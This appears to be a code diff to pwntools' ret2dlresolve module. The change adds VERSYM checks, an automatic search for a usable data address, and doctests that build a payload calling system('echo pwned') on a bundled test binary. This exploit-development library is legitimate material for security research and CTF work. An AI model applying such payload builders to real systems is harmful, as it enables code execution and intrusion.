@@ -63,6 +63,22 @@ You can also use ``Ret2dlresolve`` on AMD64:
     ... else:
     ...     p.recvline() == b'pwned\n'
     True
+
+``Ret2dlresolvePayload`` also checks that the ``VERSYM`` entry corresponding to
+``data_addr`` is zero, marking manually specified addresses with non-zero
+entries as unreliable and automatically searching for a valid address when
+``data_addr`` is not specified:
+
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"], data_addr=0x804a030)
+    >>> dlresolve.unreliable
+    True
+    >>> elf.write(0x8049fc8, p32(0x8048066))
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
+    >>> hex(dlresolve.data_addr)
+    '0x804ade0'
+    >>> dlresolve.unreliable
+    False
 """
 
 from copy import deepcopy
@@ -277,8 +293,14 @@ class Ret2dlresolvePayload:
         bss = self.elf.get_section_by_name(".bss").header.sh_addr + self.elf_load_address_fixup
         bss_size = self.elf.get_section_by_name(".bss").header.sh_size
         addr = bss + bss_size
-        addr = addr + (-addr & 0xfff) - 0x200 #next page in memory - 0x200
-        return addr
+        default_addr = addr + (-addr & 0xfff) - 0x200 #next page in memory - 0x200
+        elf_sym_size = Elf32_Sym.size if context.bits == 32 else Elf64_Sym.size
+        for cand in range(default_addr, addr - 1, -elf_sym_size):
+            index = align(elf_sym_size, cand + len(self.symbol) + 1 - self.symtab) // elf_sym_size
+            ver_addr = self.versym + 2 * index
+            if self.elf.memory[ver_addr] and self.elf.memory[ver_addr + 1] and self.elf.u16(ver_addr) == 0:
+                return cand
+        return default_addr
 
     def _build_structures(self):
         # The first part of the payload is the usual of ret2dlresolve.
@@ -339,11 +361,17 @@ class Ret2dlresolvePayload:
         log.debug("Version index addr: %#x", ver_addr)
         log.debug("Data addr: %#x", self.data_addr)
         log.debug("Resolution addr: %#x", self.resolution_addr)
-        if not self.elf.memory[ver_addr]:
+        if not (self.elf.memory[ver_addr] and self.elf.memory[ver_addr + 1]):
             log.warn("Ret2dlresolve is likely impossible in this ELF "
                      "(too big gap between text and writable sections).\n"
                      "If you get a segmentation fault with fault_addr = %#x, "
                      "try a different technique.", ver_addr)
+            self.unreliable = True
+        elif self.elf.u16(ver_addr) != 0:
+            log.warn("Ret2dlresolve is likely impossible at this address "
+                     "(non-zero version index %#x at %#x).\n"
+                     "If you get a segmentation fault, try a different data_addr or technique.",
+                     self.elf.u16(ver_addr), ver_addr)
             self.unreliable = True
 
     def _build_args(self):
